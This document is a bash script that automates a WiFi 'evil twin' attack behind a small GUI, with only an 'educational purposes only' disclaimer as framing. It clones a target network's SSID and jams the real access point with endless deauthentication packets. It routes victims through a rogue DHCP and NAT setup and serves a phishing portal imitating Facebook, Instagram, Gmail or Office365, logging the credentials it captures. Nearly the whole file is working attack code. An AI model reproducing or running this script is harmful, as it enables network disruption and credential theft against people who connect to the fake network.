#!/bin/bash

# WiFi Evil Twin Full Automation Script with GUI
# Educational purposes only

LOG=/tmp/evil_twin.log
touch "$LOG"
exec > >(tee -a "$LOG") 2>&1

# Dependencies check
for cmd in airbase-ng airodump-ng aireplay-ng hostapd dnsmasq lighttpd php zenity; do
    if ! command -v $cmd &> /dev/null; then
        zenity --error --text="$cmd is not installed."
        exit 1
    fi
done

# GUI inputs
IFACE=$(zenity --entry --title="Wi-Fi Interface" --text="Enter your wireless interface (monitor mode):")
SSID=$(zenity --entry --title="SSID" --text="Enter the SSID to clone:")
BSSID=$(zenity --entry --title="Target BSSID" --text="Enter the target AP BSSID:")
CHANNEL=$(zenity --entry --title="Channel" --text="Enter the WiFi channel of the target:")

PORTAL=$(zenity --list --title="Phishing Portal" --column="Portal" facebook instagram gmail office365)

# Confirm
zenity --question --text="Proceed with Evil Twin attack on $SSID ($BSSID)?"
[ $? -ne 0 ] && exit

# Create fake AP
xterm -hold -e "airbase-ng -e '$SSID' -c $CHANNEL -a 00:11:22:33:44:55 $IFACE" &

sleep 5

# Setup network
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0

# Configure dnsmasq
cat > /tmp/dnsmasq.conf <<EOF
interface=at0
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF
dnsmasq -C /tmp/dnsmasq.conf

# Configure iptables
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
iptables -A FORWARD -i at0 -j ACCEPT

# Hostapd not used with airbase-ng

# Setup phishing portal
rm -rf /var/www/html/*
cp -r "$(dirname "$0")/portals/$PORTAL"/* /var/www/html/
cp "$(dirname "$0")/portals/sse_log.php" /var/www/html/
cp "$(dirname "$0")/portals/ws_log_viewer.html" /var/www/html/

# Enable PHP & lighttpd
systemctl stop apache2
systemctl stop lighttpd
lighttpd -f /etc/lighttpd/lighttpd.conf

# Start jamming
xterm -hold -e "aireplay-ng --deauth 0 -a $BSSID $IFACE" &

zenity --info --text="Fake AP is running with $PORTAL portal. Monitor captured credentials in /var/www/html/log.txt or browser."

# Keep running
sleep infinity
